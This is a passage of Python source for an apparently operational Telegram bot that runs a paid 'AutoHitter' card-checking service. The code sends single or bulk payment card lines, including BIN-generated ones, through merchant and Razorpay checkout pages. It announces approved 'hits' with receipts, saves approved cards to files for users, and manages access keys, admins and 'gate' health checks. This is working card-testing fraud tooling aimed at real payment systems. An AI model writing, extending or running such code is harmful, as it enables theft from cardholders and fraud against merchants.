                f"Site: <code>{site_name}</code>\n"
                f"Analyzing target...")

            def _single_hit():
                try:
                    from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line, detect_provider, SUPPORTED_PROVIDERS
                except ImportError:
                    send_message(chat_id, f"<b>AutoHitter module not available.</b>\n\n<i>{DEVELOPER}</i>")
                    return

                url_info = URLAnalyzer.analyze(target_url)
                provider = url_info.get('provider', 'unknown')
                merchant = url_info.get('merchant', site_name)

                if provider not in SUPPORTED_PROVIDERS:
                    send_message(chat_id,
                        f"<b>Unsupported Provider</b>\n\n"
                        f"Site: <code>{site_name}</code>\n"
                        f"Detected: <code>{provider.upper()}</code>\n\n"
                        f"<i>{DEVELOPER}</i>")
                    return

                card = parse_card_line(cc_line)
                if not card:
                    send_message(chat_id, f"<b>Invalid card format.</b>\n\n<i>{DEVELOPER}</i>")
                    return

                product = url_info.get('product', 'Unknown')
                amount = url_info.get('amount')
                currency = url_info.get('currency', 'USD')
                product_url = url_info.get('product_url')

                info_lines = [
                    f"<b>⚡ Hitting...</b>\n",
                    f"🏢 Site: <code>{merchant}</code>",
                    f"🔌 Provider: <code>{provider.upper()}</code>",
                ]
                if product and product != 'Unknown':
                    info_lines.append(f"📦 Product: <code>{product}</code>")
                if amount:
                    info_lines.append(f"💰 Amount: <code>{amount} {currency}</code>")
                if product_url:
                    info_lines.append(f"🔗 URL: <code>{product_url[:60]}</code>")
                info_lines.append(f"💳 Card: <code>{cc_line}</code>")

                send_message(chat_id, "\n".join(info_lines))

                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(hit_single(target_url, card, 1))
                loop.close()

                receipt = result.get('receipt_url')
                if result.get('success'):
                    hit_lines = [
                        "<b>✅ APPROVED — HIT!</b>\n",
                        f"💳 Card: <code>{cc_line}</code>",
                        f"🏢 Site: <code>{merchant}</code>",
                        f"🔌 Provider: <code>{provider.upper()}</code>",
                    ]
                    if product and product != 'Unknown':
                        hit_lines.append(f"📦 Product: <code>{product}</code>")
                    if amount:
                        hit_lines.append(f"💰 Amount: <code>{amount} {currency}</code>")
                    hit_lines.append(f"⏱️ Time: <code>{result.get('response_time', 0):.1f}s</code>")
                    if receipt:
                        hit_lines.append(f"🔗 Receipt: <code>{receipt[:80]}</code>")
                    hit_lines.append(f"\n<i>{DEVELOPER}</i>")
                    send_message(chat_id, "\n".join(hit_lines))
                    notify_hit(user_id, username, f"AutoHitter ({provider})", cc_line, "Approved")
                elif result.get('error'):
                    send_message(chat_id,
                        f"<b>⚠️ ERROR</b>\n\n"
                        f"💳 Card: <code>{cc_line}</code>\n"
                        f"🏢 Site: <code>{site_name}</code>\n"
                        f"Error: <code>{result['error'][:80]}</code>\n\n"
                        f"<i>{DEVELOPER}</i>")
                else:
                    send_message(chat_id,
                        f"<b>❌ DECLINED</b>\n\n"
                        f"💳 Card: <code>{cc_line}</code>\n"
                        f"🏢 Site: <code>{site_name}</code>\n"
                        f"📉 Reason: <code>{result.get('decline_code', 'unknown')}</code>\n"
                        f"⏱️ Time: <code>{result.get('response_time', 0):.1f}s</code>\n\n"
                        f"<i>{DEVELOPER}</i>")

            threading.Thread(target=_single_hit, daemon=True).start()
            return

        # Bulk mode — card_lines already populated above
        with active_lock:
            if user_id in active_users:
                send_message(chat_id, f"<b>You already have a task running.</b>\n\n<i>{DEVELOPER}</i>")
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        user_limit = get_user_line_limit(user_id)
        if user_limit and len(card_lines) > user_limit:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id,
                f"<b>Too Many Cards</b>\n\n"
                f"Your key allows <code>{user_limit}</code> lines.\n"
                f"Provided: <code>{len(card_lines)}</code> cards.\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        bin_label = " (BIN gen)" if is_bin_mode else ""
        init_resp = send_message(
            chat_id,
            f"<b>⚡ AutoHitter Starting{bin_label}</b>\n\n"
            f"Site: <code>{site_name}</code>\n"
            f"Cards: <code>{len(card_lines)}</code>",
            reply_markup=stop_button_markup(user_id)
        )
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run_autohitter():
            try:
                from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line as ah_parse_card, detect_provider, SUPPORTED_PROVIDERS, SmartRateLimiter
            except ImportError:
                send_message(chat_id, f"<b>AutoHitter module not available.</b>\n\n<i>{DEVELOPER}</i>")
                with active_lock:
                    active_users.discard(user_id)
                return

            url_info = URLAnalyzer.analyze(target_url)
            provider = url_info.get('provider', 'unknown')
            merchant = url_info.get('merchant', site_name)
            ah_product = url_info.get('product', 'Unknown')
            ah_amount = url_info.get('amount')
            ah_currency = url_info.get('currency', 'USD')
            ah_product_url = url_info.get('product_url')

            if provider not in SUPPORTED_PROVIDERS:
                send_message(chat_id,
                    f"<b>Unsupported Provider</b>\n\n"
                    f"🏢 Site: <code>{site_name}</code>\n"
                    f"🔌 Detected: <code>{provider.upper()}</code>\n\n"
                    f"<i>{DEVELOPER}</i>")
                with active_lock:
                    active_users.discard(user_id)
                return

            # Build info header
            info_header = f"🏢 Site: <code>{merchant}</code>\n🔌 Provider: <code>{provider.upper()}</code>"
            if ah_product and ah_product != 'Unknown':
                info_header += f"\n📦 Product: <code>{ah_product}</code>"
            if ah_amount:
                info_header += f"\n💰 Amount: <code>{ah_amount} {ah_currency}</code>"

            if progress_msg_id:
                edit_message(chat_id, progress_msg_id,
                    f"<b>⚡ AutoHitter Active</b>\n\n"
                    f"{info_header}\n"
                    f"🎴 Cards: <code>{len(card_lines)}</code>\n\n"
                    f"⏳ Processing...",
                    reply_markup=stop_button_markup(user_id))

            rate_limiter = SmartRateLimiter()
            total = len(card_lines)
            successes = 0
            fails = 0
            approved_list = []
            last_edit = [0]
            start_time = time.time()

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            for i, line in enumerate(card_lines):
                if cancel_flags.get(user_id):
                    break

                card = ah_parse_card(line)
                if not card:
                    fails += 1
                    continue

                if i > 0:
                    delay = rate_limiter.calculate_delay('declined' if fails > successes else 'success')
                    time.sleep(delay)

                result = loop.run_until_complete(hit_single(target_url, card, i + 1))

                if result.get('success'):
                    successes += 1
                    approved_list.append(line)
                    hit_lines = [
                        f"<b>✅ HIT — APPROVED!</b>\n",
                        f"💳 <code>{line}</code>",
                        f"🏢 Site: <code>{merchant}</code>",
                    ]
                    if ah_product and ah_product != 'Unknown':
                        hit_lines.append(f"📦 Product: <code>{ah_product}</code>")
                    if ah_amount:
                        hit_lines.append(f"💰 Amount: <code>{ah_amount} {ah_currency}</code>")
                    receipt = result.get('receipt_url')
                    if receipt:
                        hit_lines.append(f"🔗 Receipt: <code>{receipt[:80]}</code>")
                    hit_lines.append(f"⏱️ Time: <code>{result.get('response_time', 0):.1f}s</code>")
                    hit_lines.append(f"[{i+1}/{total}]\n\n<i>{DEVELOPER}</i>")
                    send_message(chat_id, "\n".join(hit_lines))
                    notify_hit(user_id, username, f"AutoHitter ({provider})", line, "Approved")
                else:
                    fails += 1

                now = time.time()
                if progress_msg_id and (now - last_edit[0] >= 4 or i + 1 == total):
                    last_edit[0] = now
                    elapsed = now - start_time
                    cpm = int(((i + 1) / elapsed) * 60) if elapsed > 0 else 0
                    pct = int((i + 1) / total * 100)
                    bar_len = 16
                    filled = int(bar_len * (i + 1) / total)
                    bar = "█" * filled + "░" * (bar_len - filled)

                    markup = None if (i + 1 == total) else stop_button_markup(user_id)
                    edit_message(chat_id, progress_msg_id,
                        f"<b>⚡ AutoHitter {'✅ Complete' if i+1==total else 'Active'}</b>\n\n"
                        f"{info_header}\n\n"
                        f"<code>{bar}</code> {pct}%\n\n"
                        f"📊 Progress: <code>{i+1}/{total}</code>\n"
                        f"⚡ Speed: <code>{cpm} CPM</code>\n\n"
                        f"✅ Approved: <code>{successes}</code>\n"
                        f"❌ Failed: <code>{fails}</code>\n\n"
                        f"<i>{DEVELOPER}</i>",
                        reply_markup=markup)

            loop.close()
            cancel_flags.pop(user_id, None)

            elapsed_total = time.time() - start_time
            success_rate = int(successes / total * 100) if total > 0 else 0
            final_lines = [
                "<b>⚡ AutoHitter — Complete</b>\n",
                f"{info_header}\n",
                f"📊 Total: <code>{total}</code>",
                f"✅ Approved: <code>{successes}</code>",
                f"❌ Failed: <code>{fails}</code>",
                f"📈 Success Rate: <code>{success_rate}%</code>",
                f"⏱️ Total Time: <code>{elapsed_total:.1f}s</code>",
                f"\n<i>{DEVELOPER}</i>",
            ]
            send_message(chat_id, "\n".join(final_lines))

            if approved_list:
                filename = f"autohitter_hits_{int(time.time())}.txt"
                filepath = os.path.join(DATA_DIR, filename)
                with open(filepath, "w") as f:
                    for e in approved_list:
                        f.write(e + "\n")
                send_document(chat_id, filepath)

            with active_lock:
                active_users.discard(user_id)

        t = threading.Thread(target=_run_autohitter, daemon=True)
        t.start()
        return

    # --- /filesend ---
    if text.startswith("/filesend"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        reply = msg.get("reply_to_message")
        doc = None

        # Check if the message itself has a document (attach + command)
        if msg.get("document"):
            doc = msg["document"]
        # Check reply for document
        elif reply and reply.get("document"):
            doc = reply["document"]

        if not doc:
            send_message(chat_id,
                "<b>📁 File Send</b>\n\n"
                "<b>Usage:</b>\n"
                "1️⃣ Attach a file and type <code>/filesend</code> in caption\n"
                "2️⃣ Reply to any file with <code>/filesend</code>\n\n"
                f"File will be saved to the server.\n\n<i>{DEVELOPER}</i>")
            return

        file_name = doc.get("file_name", f"file_{int(time.time())}")
        file_size = doc.get("file_size", 0)
        file_id = doc.get("file_id")

        if not file_id:
            send_message(chat_id, f"<b>Could not get file ID.</b>\n\n<i>{DEVELOPER}</i>")
            return

        send_message(chat_id,
            f"<b>📁 Downloading...</b>\n\n"
            f"File: <code>{file_name}</code>\n"
            f"Size: <code>{file_size / 1024:.1f} KB</code>")

        def _save_file():
            try:
                content = download_file(file_id, binary=True)
                if not content:
                    send_message(chat_id, f"<b>Failed to download file.</b>\n\n<i>{DEVELOPER}</i>")
                    return

                filesent_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "filesent")
                os.makedirs(filesent_dir, exist_ok=True)

                save_path = os.path.join(filesent_dir, file_name)

                # If file exists, add timestamp
                if os.path.exists(save_path):
                    name, ext = os.path.splitext(file_name)
                    save_path = os.path.join(filesent_dir, f"{name}_{int(time.time())}{ext}")

                if isinstance(content, str):
                    with open(save_path, "w", encoding="utf-8") as f:
                        f.write(content)
                else:
                    with open(save_path, "wb") as f:
                        f.write(content)

                actual_name = os.path.basename(save_path)
                send_message(chat_id,
                    f"<b>✅ File Saved</b>\n\n"
                    f"📄 Name: <code>{actual_name}</code>\n"
                    f"📂 Location: <code>filesent/</code>\n"
                    f"💾 Size: <code>{file_size / 1024:.1f} KB</code>\n\n"
                    f"<i>{DEVELOPER}</i>")
            except Exception as e:
                send_message(chat_id, f"<b>Error saving file:</b> <code>{str(e)[:80]}</code>\n\n<i>{DEVELOPER}</i>")

        threading.Thread(target=_save_file, daemon=True).start()
        return

    # --- /adminkey ---
    if text.startswith("/adminkey"):
        if int(user_id) not in ADMIN_IDS:
            send_message(chat_id, f"<b>Owner only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id,
                "<b>Usage:</b> <code>/adminkey 123456789 7d</code>\n"
                f"Duration optional (default: permanent).\n\n<i>{DEVELOPER}</i>")
            return
        target_id = parts[1].strip()
        if not target_id.isdigit():
            send_message(chat_id, f"<b>Invalid user ID.</b>\n\n<i>{DEVELOPER}</i>")
            return
        duration_seconds = None
        if len(parts) >= 3:
            parsed = parse_duration(parts[2])
            if parsed == -1:
                send_message(chat_id, f"<b>Invalid duration.</b>\nExamples: 7d, 1mo, perm\n\n<i>{DEVELOPER}</i>")
                return
            duration_seconds = parsed
        admins = _load_json(ADMINS_FILE, {})
        entry = {"promoted_by": user_id, "promoted_at": time.time()}
        if duration_seconds is not None:
            entry["expires_at"] = time.time() + duration_seconds
        else:
            entry["expires_at"] = None
        admins[target_id] = entry
        _save_json(ADMINS_FILE, admins)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        send_message(chat_id,
            f"<b>Admin Granted</b>\n\n"
            f"User: <code>{target_id}</code>\n"
            f"Duration: <code>{dur_label}</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /adminlist ---
    if text == "/adminlist":
        if int(user_id) not in ADMIN_IDS:
            send_message(chat_id, f"<b>Owner only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        admins = _load_json(ADMINS_FILE, {})
        lines_out = []
        now = time.time()
        for uid, entry in admins.items():
            expires_at = entry.get("expires_at")
            if expires_at is None:
                exp = "Permanent"
            elif now > expires_at:
                exp = "EXPIRED"
            else:
                remaining = int(expires_at - now)
                exp = fmt_duration(remaining) + " left"
            lines_out.append(f"  {uid}  ·  {exp}")
        for oid in ADMIN_IDS:
            lines_out.insert(0, f"  {oid}  ·  Owner (permanent)")
        send_message(chat_id,
            f"<b>Admins ({len(lines_out)})</b>\n\n"
            "<code>" + "\n".join(lines_out) + "</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /chkapi* ---
    if text in CHKAPI_CMDS:
        if not is_admin(user_id):
            return
        gate_key = CHKAPI_CMDS[text]
        gate_info = GATE_PROBE_MAP.get(gate_key, {})
        gate_name = gate_info.get("name", gate_key)
        currently_enabled = is_gate_enabled(gate_key)

        send_message(chat_id, f"<b>Probing {gate_name}...</b>")
        alive, latency, detail = probe_gate(gate_key)

        if alive:
            status_line = f"<b>ALIVE</b> — {latency}ms"
            action_text = "Gate is working. Want to disable it?"
            buttons = {"inline_keyboard": [[
                {"text": "Disable", "callback_data": f"gate_off_{gate_key}"},
                {"text": "Keep", "callback_data": "gate_keep"},
            ]]}
        else:
            status_line = f"<b>DEAD</b> — {detail}"
            if currently_enabled:
                action_text = "API is down. Disable this gate?"
                buttons = {"inline_keyboard": [[
                    {"text": "Yes, disable", "callback_data": f"gate_off_{gate_key}"},
                    {"text": "Keep enabled", "callback_data": "gate_keep"},
                ]]}
            else:
                action_text = "Gate is disabled. Re-enable?"
                buttons = {"inline_keyboard": [[
                    {"text": "Re-enable", "callback_data": f"gate_on_{gate_key}"},
                    {"text": "Keep off", "callback_data": "gate_keep"},
                ]]}

        enabled_label = "Enabled" if currently_enabled else "Disabled"
        send_message(chat_id,
            f"<b>API Check — {gate_name}</b>\n\n"
            f"Status: {status_line}\n"
            f"Detail: <code>{detail}</code>\n"
            f"Latency: <code>{latency}ms</code>\n"
            f"Currently: {enabled_label}\n\n"
            f"{action_text}\n\n"
            f"<i>{DEVELOPER}</i>",
            reply_markup=buttons)
        return

    # --- /chkapis ---
    if text == "/chkapis":
        if not is_admin(user_id):
            return
        send_message(chat_id, "<b>Checking all gates...</b>")
        lines_out = ["<b>API Health Report</b>\n"]
        any_dead = []
        for gate_key, info in GATE_PROBE_MAP.items():
            alive, latency, detail = probe_gate(gate_key)
            enabled = is_gate_enabled(gate_key)
            if alive:
                status = f"Alive ({latency}ms)"
            else:
                status = f"Dead — {detail}"
                any_dead.append(gate_key)
            en_text = "On" if enabled else "Off"
            lines_out.append(
                f"<code>{info['cmd']}</code> — {info['name']}\n"
                f"    {status}  ·  {en_text}")
        if any_dead:
            lines_out.append(f"\n<b>{len(any_dead)} dead gate(s)</b>")
        else:
            lines_out.append(f"\n<b>All gates operational</b>")
        lines_out.append(f"\n<i>{DEVELOPER}</i>")
        send_message(chat_id, "\n".join(lines_out))
        return

    # --- /gates ---
    if text == "/gates":
        gs = load_gate_stats()
        lines_out = ["<b>Available Gates</b>\n"]
        for key, cmd, label, live in GATE_REGISTRY:
            enabled = is_gate_enabled(key)
            if not live:
                status_text = "Soon"
            elif not enabled:
                status_text = "Disabled"
            else:
                status_text = "Live"
            s = gs.get(key, {})
            total = s.get("total", 0)
            approved = s.get("approved", 0)
            rate = round((approved / total) * 100, 1) if total > 0 else 0
            lines_out.append(
                f"<code>{cmd}</code>  ·  {label}\n"
                f"    {status_text}  ·  {total} checked  ·  {approved} hits  ·  {rate}%")
        lines_out.append(f"\n<i>{DEVELOPER}</i>")
        send_message(chat_id, "\n".join(lines_out))
        return

    # --- /stats ---
    if text == "/stats":
        send_message(chat_id, fmt_stats(user_id))
        return

    # --- /mykey ---
    if text == "/mykey":
        send_message(chat_id, fmt_mykey(user_id))
        return

    # --- /genkey ---
    if text.startswith("/genkey") and not text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        parts = text.split()
        line_limit = None
        duration_seconds = None
        if len(parts) >= 2:
            try:
                line_limit = int(parts[1])
                if len(parts) >= 3:
                    parsed = parse_duration(parts[2])
                    if parsed == -1:
                        send_message(chat_id, f"<b>Invalid duration.</b>\nExamples: 1d, 7d, 1mo, perm\n\n<i>{DEVELOPER}</i>")
                        return
                    duration_seconds = parsed
            except ValueError:
                parsed = parse_duration(parts[1])
                if parsed == -1:
                    send_message(chat_id,
                        f"<b>Usage:</b> <code>/genkey [limit] [duration]</code>\n"
                        f"Examples: /genkey 500 7d, /genkey 7d, /genkey\n\n<i>{DEVELOPER}</i>")
                    return
                duration_seconds = parsed
        key = generate_key()
        keys = load_keys()
        keys[key] = {
            "created_by": user_id,
            "created_at": time.time(),
            "used": False,
            "duration": duration_seconds,
            "line_limit": line_limit,
        }
        save_keys(keys)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        send_message(chat_id,
            f"<b>Key Generated</b>\n\n"
            f"<code>{key}</code>\n"
            f"Duration: <code>{dur_label}</code>\n"
            f"Line Limit: <code>{limit_label}</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /genkeys ---
    if text.startswith("/genkeys"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id,
                f"<b>Usage:</b> <code>/genkeys 10 500 7d</code>\n\n"
                f"count · limit · duration\n\n<i>{DEVELOPER}</i>")
            return
        try:
            count = int(parts[1])
        except ValueError:
            send_message(chat_id, f"<b>Invalid count.</b>\n\n<i>{DEVELOPER}</i>")
            return
        if count < 1 or count > 500:
            send_message(chat_id, f"<b>Count must be 1-500.</b>\n\n<i>{DEVELOPER}</i>")
            return
        line_limit = None
        duration_seconds = None
        if len(parts) >= 3:
            try:
                line_limit = int(parts[2])
                if len(parts) >= 4:
                    parsed = parse_duration(parts[3])
                    if parsed == -1:
                        send_message(chat_id, f"<b>Invalid duration.</b>\n\n<i>{DEVELOPER}</i>")
                        return
                    duration_seconds = parsed
            except ValueError:
                parsed = parse_duration(parts[2])
                if parsed == -1:
                    send_message(chat_id, f"<b>Invalid format.</b>\n\n<i>{DEVELOPER}</i>")
                    return
                duration_seconds = parsed
        keys = load_keys()
        generated = []
        for _ in range(count):
            key = generate_key()
            keys[key] = {
                "created_by": user_id,
                "created_at": time.time(),
                "used": False,
                "duration": duration_seconds,
                "line_limit": line_limit,
            }
            generated.append(key)
        save_keys(keys)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        filename = f"keys_{count}x_{int(time.time())}.txt"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, "w") as f:
            for k in generated:
                f.write(k + "\n")
        send_document(chat_id, filepath, filename,
            caption=f"<b>{count} Keys Generated</b>\n"
                    f"Duration: <code>{dur_label}</code>\n"
                    f"Line Limit: <code>{limit_label}</code>\n\n"
                    f"<i>{DEVELOPER}</i>")
        return

    # --- /revoke ---
    if text.startswith("/revoke"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> <code>/revoke 123456789</code>\n\n<i>{DEVELOPER}</i>")
            return
        target_id = parts[1].strip()
        users = load_users()
        if target_id in users:
            del users[target_id]
            save_users(users)
            send_message(chat_id, f"<b>Access Revoked</b>\n\nUser <code>{target_id}</code> removed.\n\n<i>{DEVELOPER}</i>")
        else:
            send_message(chat_id, f"<b>User not found.</b>\n\n<code>{target_id}</code> is not authorized.\n\n<i>{DEVELOPER}</i>")
        return

    # --- /authlist ---
    if text == "/authlist":
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        users = load_users()
        if not users:
            send_message(chat_id, f"<b>No authorized users.</b>\n\n<i>{DEVELOPER}</i>")
            return
        lines_out = []
        now = time.time()
        for uid, entry in users.items():
            key = entry.get("key", "N/A")
            expires_at = entry.get("expires_at")
            if expires_at is None:
                exp = "Permanent"
            elif now > expires_at:
                exp = "EXPIRED"
            else:
                remaining = int(expires_at - now)
                exp = fmt_duration(remaining) + " left"
            lines_out.append(f"  {uid}  ·  {key[:10]}...  ·  {exp}")
        send_message(chat_id,
            f"<b>Authorized Users ({len(users)})</b>\n\n"
            "<code>" + "\n".join(lines_out) + "</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /broadcast ---
    if text.startswith("/broadcast"):
        if not is_admin(user_id):
            send_message(chat_id, f"<b>Admin only.</b>\n\n<i>{DEVELOPER}</i>")
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> /broadcast Your message here\n\n<i>{DEVELOPER}</i>")
            return
        broadcast_text = parts[1]
        users = load_users()
        sent = 0
        failed = 0
        for uid in users:
            try:
                resp = send_message(int(uid), f"<b>Broadcast</b>\n\n{broadcast_text}\n\n<i>{DEVELOPER}</i>")
                if resp.get("ok"):
                    sent += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
        send_message(chat_id,
            f"<b>Broadcast Complete</b>\n\n"
            f"Sent: <code>{sent}</code>\n"
            f"Failed: <code>{failed}</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /redeem ---
    if text.startswith("/redeem"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"<b>Usage:</b> <code>/redeem YOUR-KEY</code>\n\n<i>{DEVELOPER}</i>")
            return
        key = parts[1].strip()
        keys = load_keys()
        if key not in keys:
            send_message(chat_id, f"<b>Invalid key.</b>\n\n<i>{DEVELOPER}</i>")
            return
        if keys[key].get("used"):
            send_message(chat_id, f"<b>Key already used.</b>\n\n<i>{DEVELOPER}</i>")
            return
        keys[key]["used"] = True
        keys[key]["used_by"] = user_id
        save_keys(keys)
        duration_seconds = keys[key].get("duration")
        line_limit = keys[key].get("line_limit")
        authorize_user(user_id, key, duration_seconds, line_limit)
        dur_label = fmt_duration(duration_seconds) if duration_seconds else "Permanent"
        limit_label = str(line_limit) if line_limit else "Unlimited"
        send_message(chat_id,
            f"<b>Access Granted</b>\n\n"
            f"Duration: <code>{dur_label}</code>\n"
            f"Line Limit: <code>{limit_label}</code>\n\n"
            f"Welcome aboard.\n\n"
            f"<i>{DEVELOPER}</i>")

        # Notify GC about new user
        notify_new_user(user_id, username, f"Duration: {dur_label} | Limit: {limit_label}")
        return

    # --- /rpaysite (manage Razorpay sites for /rpay) ---
    if text.startswith("/rpaysite"):
        if not is_admin(user_id):
            sites = load_rpay_sites()
            send_message(chat_id,
                f"<b>Razorpay Sites</b>\n\n"
                f"Loaded: <code>{len(sites)}</code> site(s)\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        parts = text.split(maxsplit=1)
        new_sites_raw = []

        reply = msg.get("reply_to_message")
        if reply and reply.get("document"):
            doc = reply["document"]
            fname = doc.get("file_name", "")
            if fname.lower().endswith(".txt"):
                content = download_file(doc["file_id"])
                if content:
                    new_sites_raw = [l.strip() for l in content.splitlines()
                                     if l.strip() and not l.strip().startswith('#')]

        if len(parts) >= 2:
            sub = parts[1].strip()

            if sub.lower() == "list":
                sites = load_rpay_sites()
                if not sites:
                    send_message(chat_id,
                        "<b>RPay Sites — Empty</b>\n\n"
                        "No sites added yet.\n"
                        "Use <code>/rpaysite URL</code> to add.\n\n"
                        f"<i>{DEVELOPER}</i>")
                else:
                    lines_out = []
                    for i, s in enumerate(sites[:30], 1):
                        masked = s[:40] + "..." if len(s) > 40 else s
                        lines_out.append(f"  {i}. <code>{masked}</code>")
                    extra = f"\n... and {len(sites) - 30} more" if len(sites) > 30 else ""
                    send_message(chat_id,
                        f"<b>RPay Sites ({len(sites)})</b>\n\n"
                        + "\n".join(lines_out) + extra +
                        f"\n\n<i>{DEVELOPER}</i>")
                return

            if sub.lower() == "clear":
                save_rpay_sites([])
                send_message(chat_id,
                    "<b>RPay Sites Cleared</b>\n\n"
                    f"All sites removed.\n\n<i>{DEVELOPER}</i>")
                return

            if sub.lower().startswith("remove "):
                remove_url = sub[7:].strip()
                sites = load_rpay_sites()
                new_sites = [s for s in sites if s.lower() != remove_url.lower()
                             and s.lower().replace('https://', '').replace('http://', '').rstrip('/')
                             != remove_url.lower().replace('https://', '').replace('http://', '').rstrip('/')]
                removed = len(sites) - len(new_sites)
                save_rpay_sites(new_sites)
                send_message(chat_id,
                    f"<b>Removed {removed} site(s)</b>\n\n"
                    f"Remaining: <code>{len(new_sites)}</code>\n\n"
                    f"<i>{DEVELOPER}</i>")
                return

            inline_sites = [l.strip() for l in sub.splitlines() if l.strip() and not l.strip().startswith('#')]
            expanded = []
            for s in inline_sites:
                if ',' in s:
                    expanded.extend([x.strip() for x in s.split(',') if x.strip()])
                else:
                    expanded.append(s)
            new_sites_raw.extend(expanded)

        if not new_sites_raw:
            sites = load_rpay_sites()
            send_message(chat_id,
                "<b>RPay Site Management</b>\n\n"
                f"Current sites: <code>{len(sites)}</code>\n\n"
                "<b>Add sites:</b>\n"
                "<code>/rpaysite https://razorpay.me/@merchant</code>\n\n"
                "<b>Multiple sites:</b>\n"
                "<code>/rpaysite\n"
                "https://site1.com\n"
                "https://site2.com</code>\n\n"
                "<b>From file:</b>\n"
                "Reply to a .txt file with <code>/rpaysite</code>\n\n"
                "<b>Other commands:</b>\n"
                "<code>/rpaysite list</code>  ·  List all sites\n"
                "<code>/rpaysite clear</code>  ·  Remove all\n"
                "<code>/rpaysite remove URL</code>  ·  Remove one\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        send_message(chat_id,
            f"<b>Validating {len(new_sites_raw)} site(s)...</b>\n"
            "Checking Razorpay compatibility...")

        def _do_validate_rpay():
            existing = load_rpay_sites()
            existing_normalized = set(
                s.lower().replace('https://', '').replace('http://', '').rstrip('/')
                for s in existing
            )
            valid = []
            invalid = []
            duplicate = []
            results_lines = []

            for raw_site in new_sites_raw:
                site_url = raw_site.strip()
                if not site_url.startswith(('http://', 'https://')):
                    site_url = 'https://' + site_url
                site_url = site_url.rstrip('/')

                normalized = site_url.lower().replace('https://', '').replace('http://', '').rstrip('/')

                if normalized in existing_normalized:
                    duplicate.append(site_url)
                    masked = site_url[:40] + "..." if len(site_url) > 40 else site_url
                    results_lines.append(f"⚠️ <code>{masked}</code> — Already added")
                    continue

                is_valid, detail = rpay_validate_site(site_url)
                masked = site_url[:40] + "..." if len(site_url) > 40 else site_url

                if is_valid:
                    valid.append(site_url)
                    existing_normalized.add(normalized)
                    results_lines.append(f"✅ <code>{masked}</code> — {detail}")
                else:
                    invalid.append(site_url)
                    results_lines.append(f"❌ <code>{masked}</code> — {detail}")

            if valid:
                existing.extend(valid)
                save_rpay_sites(existing)

            send_message(chat_id,
                f"<b>RPay Site Results</b>\n\n"
                f"Submitted: <code>{len(new_sites_raw)}</code>\n"
                f"✅ Added: <code>{len(valid)}</code>\n"
                f"❌ Invalid: <code>{len(invalid)}</code>\n"
                f"⚠️ Duplicate: <code>{len(duplicate)}</code>\n"
                f"Total sites: <code>{len(existing)}</code>\n\n"
                + "\n".join(results_lines[:20]) +
                (f"\n... and {len(results_lines) - 20} more" if len(results_lines) > 20 else "") +
                f"\n\n<i>{DEVELOPER}</i>")

        threading.Thread(target=_do_validate_rpay, daemon=True).start()
        return

    # --- /authsite (admin — set /auth gate site URL) ---
    if text.startswith("/authsite"):
        if not is_admin(user_id):
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            cfg = auth_get_config()
            send_message(chat_id,
                "<b>Auth Gate Site</b>\n\n"
                f"Current: <code>{cfg.get('site_url', 'N/A')}</code>\n\n"
                "<b>Change:</b> <code>/authsite https://newsite.com</code>\n\n"
                f"<i>{DEVELOPER}</i>")
            return
        new_url = parts[1].strip().rstrip('/')
        if not new_url.startswith(('http://', 'https://')):
            new_url = 'https://' + new_url
        auth_update_config("site_url", new_url)
        send_message(chat_id,
            f"<b>Auth Site Updated</b>\n\n"
            f"New URL: <code>{new_url}</code>\n\n"
            f"<i>{DEVELOPER}</i>")
        return

    # --- /chr1config removed (legacy gate) ---

    # --- Gate commands ---
    cmd_base = text.split()[0] if text else ""
    if cmd_base in GATE_MAP:
        gate, gate_label = GATE_MAP[cmd_base]

        if not is_gate_enabled(gate):
            send_message(chat_id,
                f"<b>{gate_label} — Offline</b>\n\n"
                f"This gate has been disabled by an admin.\n"
                f"Try another gate or check /gates for available options.\n\n"
                f"<i>{DEVELOPER}</i>")
            return

        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return

        # Single card mode
        parts = text.split(maxsplit=1)
        if len(parts) == 2 and '|' in parts[1]:
            cc_input = parts[1].strip()
            c_data = cc_input.split('|')
            if len(c_data) != 4:
